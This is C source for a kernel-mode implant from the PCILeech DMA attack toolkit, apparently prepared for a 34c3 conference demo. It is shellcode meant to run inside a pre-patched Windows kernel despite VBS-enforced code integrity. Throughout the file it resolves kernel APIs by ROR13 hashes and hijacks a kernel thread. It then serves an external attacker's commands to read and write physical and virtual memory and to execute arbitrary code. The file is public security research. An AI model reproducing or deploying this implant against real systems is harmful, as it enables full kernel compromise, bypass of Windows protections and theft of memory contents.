// uefi_winload_ntos_kmd_c.c : special kmd for use in pre-patched ntoskrnl.exe with VBS enforced code integrity
//
// (planned to be used in demo at 34c3)
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel uefi_winload_ntos_kmd_c.c
// ml64.exe uefi_winload_ntos_kmd.asm /Feuefi_winload_ntos_kmd.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main uefi_winload_ntos_kmd_c.obj
// shellcode64.exe -o uefi_winload_ntos_kmd.exe
//
#include <windows.h>
#pragma warning( disable : 4047 4055 4127)

typedef unsigned __int64		QWORD, *PQWORD;
typedef __int64					PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

// ----------------------------- KERNEL DEFINES AND TYPEDEFS BELOW -----------------------------

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID *PCLIENT_ID;

typedef _IRQL_requires_same_ _Function_class_(KSTART_ROUTINE) VOID KSTART_ROUTINE(
	_In_ PVOID StartContext
);
typedef KSTART_ROUTINE *PKSTART_ROUTINE;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH   Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;
typedef CONST OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

typedef enum _MEMORY_CACHING_TYPE {
	MmNonCached = 0,
	MmCached = 1,
	MmWriteCombined = 2,
	MmHardwareCoherentCached = 3,
	MmNonCachedUnordered = 4,
	MmUSWCCached = 5,
	MmMaximumCacheType = 6
} MEMORY_CACHING_TYPE;

typedef struct _PHYSICAL_MEMORY_RANGE {
	PHYSICAL_ADDRESS BaseAddress;
	LARGE_INTEGER NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef enum _MODE {
	KernelMode,
	UserMode,
	MaximumMode
} MODE;

// ----------------------------- ROR13 HASHES BELOW -----------------------------

#define H_ExFreePool							0x9d489d1f
#define H_MmAllocateContiguousMemory			0x9f361ebc
#define H_MmFreeContiguousMemory				0x1345f592
#define H_MmGetPhysicalAddress					0x5a326357
#define H_MmGetPhysicalMemoryRanges				0x4977a56f
#define H_MmMapIoSpace							0x05ddbef9
#define H_MmUnmapIoSpace						0x6c6ec5c9
#define H_PsCreateSystemThread					0x94a06b02
#define H_RtlCopyMemory							0xcf64979b
#define H_RtlZeroMemory							0xc53d4fdb
#define H_ZwProtectVirtualMemory				0xbc3f4d89
#define H_KeDelayExecutionThread				0x58586d92
#define H_RtlZeroMemory							0xc53d4fdb

// ----------------------------- SHELLCODE DEFINES AND TYPEDEFS BELOW (STAGE2) -----------------------------

#undef RtlCopyMemory
#undef RtlZeroMemory
typedef struct tdNTOS {
	VOID(*ExFreePool)(
		_In_ PVOID P
		);
	VOID(*MmFreeContiguousMemory)(
		_In_ PVOID BaseAddress
		);
	PVOID(*MmAllocateContiguousMemory)(
		_In_ SIZE_T NumberOfBytes,
		_In_ PHYSICAL_ADDRESS HighestAcceptableAddress
		);
	PHYSICAL_ADDRESS(*MmGetPhysicalAddress)(
		_In_ PVOID BaseAddress
		);
	PPHYSICAL_MEMORY_RANGE(*MmGetPhysicalMemoryRanges)(
		VOID
		);
	PVOID(*MmMapIoSpace)(
		_In_  PHYSICAL_ADDRESS    PhysicalAddress,
		_In_  SIZE_T              NumberOfBytes,
		_In_  MEMORY_CACHING_TYPE CacheType
		);
	VOID(*MmUnmapIoSpace)(
		_In_  PVOID  BaseAddress,
		_In_  SIZE_T NumberOfBytes
		);
	NTSTATUS(*PsCreateSystemThread)(
		_Out_      PHANDLE            ThreadHandle,
		_In_       ULONG              DesiredAccess,
		_In_opt_   POBJECT_ATTRIBUTES ObjectAttributes,
		_In_opt_   HANDLE             ProcessHandle,
		_Out_opt_  PCLIENT_ID         ClientId,
		_In_       PKSTART_ROUTINE    StartRoutine,
		_In_opt_   PVOID              StartContext
		);
	VOID(*RtlCopyMemory)(
		_Out_       VOID UNALIGNED *Destination,
		_In_  const VOID UNALIGNED *Source,
		_In_        SIZE_T         Length
		);
	NTSTATUS(*ZwProtectVirtualMemory)(
		_In_ HANDLE ProcessHandle,
		_Inout_ PVOID *BaseAddress,
		_Inout_ PSIZE_T RegionSize,
		_In_ ULONG NewProtect,
		_Out_ PULONG OldProtect
		);
	NTSTATUS(*KeDelayExecutionThread)(
		_In_ MODE            WaitMode,
		_In_ BOOLEAN         Alertable,
		_In_ PINT64          pllInterval_Neg100ns
		);
	QWORD ReservedFutureUse[21];
} NTOS, *PNTOS;

#define KMDDATA_OPERATING_SYSTEM_WINDOWS		0x01
#define KMDDATA_MAGIC							0xff11337711333377

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	NTOS fn;						// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

// ----------------------------- SHELLCODE FUNCTIONS BELOW (STAGE2) -----------------------------

DWORD HashROR13A(_In_ LPCSTR sz)
{
	DWORD dwVal, dwHash = 0;
	while(*sz) {
		dwVal = (DWORD)*sz++;
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash += dwVal;
	}
	return dwHash;
}

/*
* Lookup a function and return it, if found.
* -- hModule
* -- dwProcNameH
* -- return
*/
QWORD PEGetProcAddressH(_In_ QWORD hModule, _In_ DWORD dwProcNameH)
{
	PDWORD pdwRVAAddrNames, pdwRVAAddrFunctions;
	PWORD pwNameOrdinals;
	DWORD i, dwFnIdx, dwHash;
	LPSTR sz;
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule; // dos header.
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(hModule + dosHeader->e_lfanew); // nt header
	PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule);
	pdwRVAAddrNames = (PDWORD)(hModule + exp->AddressOfNames);
	pwNameOrdinals = (PWORD)(hModule + exp->AddressOfNameOrdinals);
	pdwRVAAddrFunctions = (PDWORD)(hModule + exp->AddressOfFunctions);
	for(i = 0; i < exp->NumberOfNames; i++) {
		sz = (LPSTR)(hModule + pdwRVAAddrNames[i]);
		dwHash = HashROR13A(sz);
		if(dwHash == dwProcNameH) {
			dwFnIdx = pwNameOrdinals[i];
			if(dwFnIdx >= exp->NumberOfFunctions) { return 0; }
			return hModule + pdwRVAAddrFunctions[dwFnIdx];
		}
	}
	return 0;
}

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7
#define KMD_CMD_EXEC_EXTENDED	8

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID stage3_c_MainCommandLoop(PKMDDATA pk)
{
	LONGLONG llTimeToWait = -10000; // 1000 uS (negative multiples of 100ns)
	PVOID pvBufferOutDMA;
	PPHYSICAL_MEMORY_RANGE pMemMap;
	PVOID pvMM = NULL;
	QWORD i, idleCount = 0;
	// 1: set up mem out dma area 16MB//4MB in lower 4GB
	pk->DMASizeBuffer = 0x1000000;
	pvBufferOutDMA = pk->fn.MmAllocateContiguousMemory(0x01000000, 0xffffffff);
	if(!pvBufferOutDMA) {
		pk->DMASizeBuffer = 0x00400000;
		pvBufferOutDMA = pk->fn.MmAllocateContiguousMemory(0x00400000, 0xffffffff);
	}
	if(!pvBufferOutDMA) {
		pk->DMASizeBuffer = 0;
		pk->_status = 0xf0000001;
		return;
	}
	pk->DMAAddrVirtual = (QWORD)pvBufferOutDMA;
	pk->DMAAddrPhysical = pk->fn.MmGetPhysicalAddress(pvBufferOutDMA);
	// 2: main dump loop
	while(TRUE) {
		pk->_status = 1;
		if(KMD_CMD_COMPLETED == pk->_op) { // NOP
			idleCount++;
			// thread wait after X number of idle loops - TODO: change to timing
			if(idleCount > 10000000000) {
				pk->fn.KeDelayExecutionThread(KernelMode, FALSE, &llTimeToWait);
			}
			continue;
		}
		pk->_status = 2;
		if(KMD_CMD_TERMINATE == pk->_op) { // EXIT
			pk->_status = 0xf0000000;
			pk->fn.MmFreeContiguousMemory(pvBufferOutDMA);
			pk->DMAAddrPhysical = 0;
			pk->DMAAddrVirtual = 0;
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			pMemMap = pk->fn.MmGetPhysicalMemoryRanges();
			if(pMemMap == NULL) {
				pk->_result = FALSE;
			} else {
				for(i = 0; (pMemMap[i].BaseAddress) || (pMemMap[i].NumberOfBytes.QuadPart); i++);
				pk->_size = i * sizeof(PHYSICAL_MEMORY_RANGE);
				pk->fn.RtlCopyMemory(pvBufferOutDMA, pMemMap, pk->_size);
				pk->fn.ExFreePool(pMemMap);
				pk->_result = TRUE;
			}
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			if(pk->dataIn[9]) {
				// PSCMD_KERNEL
				((VOID(*)(PKMDDATA))pk->ReservedKMD[1])(pk);
				pk->_result = TRUE;
			} else {
				// VFS
				((VOID(*)(PKMDDATA))pk->ReservedKMD[0])(pk);
				pk->_result = TRUE;
			}
		}
		if(KMD_CMD_READ == pk->_op || KMD_CMD_WRITE == pk->_op) { // PHYSICAL MEMORY READ/WRITE
			if(pk->dataIn[9] == 0) {
				pvMM = NULL; // no memory read if vfs (might crash the system accidentally)
			} else {
				pvMM = pk->fn.MmMapIoSpace(pk->_address, pk->_size, 0);
			}
			if(pvMM) {
				if(KMD_CMD_READ == pk->_op) { // READ
					pk->fn.RtlCopyMemory(pvBufferOutDMA, pvMM, pk->_size);
				} else { // WRITE
					pk->fn.RtlCopyMemory(pvMM, pvBufferOutDMA, pk->_size);
				}
				pk->fn.MmUnmapIoSpace(pvMM, pk->_size);
				pk->_result = TRUE;
			} else {
				pk->_result = FALSE;
			}
		}
		if(KMD_CMD_READ_VA == pk->_op) { // READ Virtual Address
			pk->fn.RtlCopyMemory(pvBufferOutDMA, (PVOID)pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE_VA == pk->_op) { // WRITE Virtual Address
			pk->fn.RtlCopyMemory((PVOID)pk->_address, pvBufferOutDMA, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
		idleCount = 0;
	}
}

#define DATA_OFFSET_TRIGGER_COUNT	0x02
#define DATA_OFFSET_KMD_THIS		0x08
#define DATA_OFFSET_VFS				0x0c
#define DATA_OFFSET_PSCMD_KERNEL	0x10
#define DATA_OFFSET_PSCMD_USER		0x14
VOID c_EntryPoint_Thread(QWORD qwAddrNtosBase, QWORD qwAddrKmdBase)
{
	PVOID(*MmMapIoSpace)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE);
	VOID(*MmUnmapIoSpace)(PVOID, SIZE_T);
	PVOID(*MmAllocateContiguousMemory)(SIZE_T, PHYSICAL_ADDRESS);
	PHYSICAL_ADDRESS(*MmGetPhysicalAddress)(PVOID);
	VOID(*RtlZeroMemory)(PVOID, SIZE_T);
	PVOID pvKMD, pvPA1000;
	PKMDDATA pk;
	DWORD i = 0, NAMES[32];
	QWORD vaAddrZero;
	MmMapIoSpace = (PVOID(*)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE))PEGetProcAddressH(qwAddrNtosBase, H_MmMapIoSpace);
	MmUnmapIoSpace = (VOID(*)(PVOID, SIZE_T))PEGetProcAddressH(qwAddrNtosBase, H_MmUnmapIoSpace);
	MmAllocateContiguousMemory = (PVOID(*)(SIZE_T, PHYSICAL_ADDRESS))PEGetProcAddressH(qwAddrNtosBase, H_MmAllocateContiguousMemory);
	MmGetPhysicalAddress = (PHYSICAL_ADDRESS(*)(PVOID))PEGetProcAddressH(qwAddrNtosBase, H_MmGetPhysicalAddress);
	RtlZeroMemory = (VOID(*)(PVOID, SIZE_T))PEGetProcAddressH(qwAddrNtosBase, H_RtlZeroMemory);
	pvKMD = MmMapIoSpace(0x3000, 0x1000, 0);
	if(!pvKMD) { return; }
	RtlZeroMemory(pvKMD, 0x1000);
	pk = (PKMDDATA)pvKMD;
	pk->AddrKernelBase = qwAddrNtosBase;
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_WINDOWS;
	vaAddrZero = qwAddrKmdBase - *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_KMD_THIS);
	pk->ReservedKMD[0] = vaAddrZero + *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_VFS);
	pk->ReservedKMD[1] = vaAddrZero + *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_PSCMD_KERNEL);
	pk->ReservedKMD[2] = vaAddrZero + *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_PSCMD_USER);
	NAMES[i++] = H_ExFreePool;
	NAMES[i++] = H_MmFreeContiguousMemory;
	NAMES[i++] = H_MmAllocateContiguousMemory;
	NAMES[i++] = H_MmGetPhysicalAddress;
	NAMES[i++] = H_MmGetPhysicalMemoryRanges;
	NAMES[i++] = H_MmMapIoSpace;
	NAMES[i++] = H_MmUnmapIoSpace;
	NAMES[i++] = H_PsCreateSystemThread;
	NAMES[i++] = H_RtlCopyMemory;
	NAMES[i++] = H_ZwProtectVirtualMemory;
	NAMES[i++] = H_KeDelayExecutionThread;
	while(i) {
		i--;
		*((PQWORD)&pk->fn + i) = PEGetProcAddressH(pk->AddrKernelBase, NAMES[i]);
	}
	pvPA1000 = MmMapIoSpace(0x1000, 0x1000, 0);
	*(PQWORD)((QWORD)pvPA1000 + 0xc0) = MmGetPhysicalAddress(pvKMD);
	*(PQWORD)((QWORD)pvPA1000 + 0xb0) = KMDDATA_MAGIC;
	MmUnmapIoSpace(pvPA1000, 0x1000);
	stage3_c_MainCommandLoop(pk);
}

VOID c_EntryPoint(QWORD qwAddrNtosBase, QWORD qwAddrKmdBase, QWORD qwCR3)
{
	PVOID(*MmMapIoSpace)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE);
	VOID(*MmUnmapIoSpace)(PVOID, SIZE_T);
	PVOID pvPA1000;
	QWORD count;
	WORD cTrigger;
	MmMapIoSpace = (PVOID(*)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE))PEGetProcAddressH(qwAddrNtosBase, H_MmMapIoSpace);
	MmUnmapIoSpace = (VOID(*)(PVOID, SIZE_T))PEGetProcAddressH(qwAddrNtosBase, H_MmUnmapIoSpace);
	pvPA1000 = MmMapIoSpace(0x1000, 0x1000, 0);
	if(!pvPA1000) { return; }
	if((*(PQWORD)((QWORD)pvPA1000 + 0xa0) == qwCR3)) {
		cTrigger = *(PWORD)(qwAddrKmdBase + DATA_OFFSET_TRIGGER_COUNT);
		count = *(PQWORD)((QWORD)pvPA1000 + 0xb8) = *(PQWORD)((QWORD)pvPA1000 + 0xb8) + 1;
		if(count == cTrigger) {
			MmUnmapIoSpace(pvPA1000, 0x1000);
			//INFO: it seems like we cannot create system thread due to security checks
			//PsCreateSystemThread = (NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE, PCLIENT_ID, PKSTART_ROUTINE, PVOID))PEGetProcAddressH(qwAddrNtosBase, H_PsCreateSystemThread);
			//PsCreateSystemThread(&hThread, 0x1ffff, NULL, NULL, NULL, (PKSTART_ROUTINE)c_EntryPoint_Thread, (PVOID)qwAddrNtosBase);
			//INFO: hijack is fine with 'security' though =P			
			c_EntryPoint_Thread(qwAddrNtosBase, qwAddrKmdBase);
			return;
		}
	}
	MmUnmapIoSpace(pvPA1000, 0x1000);
}
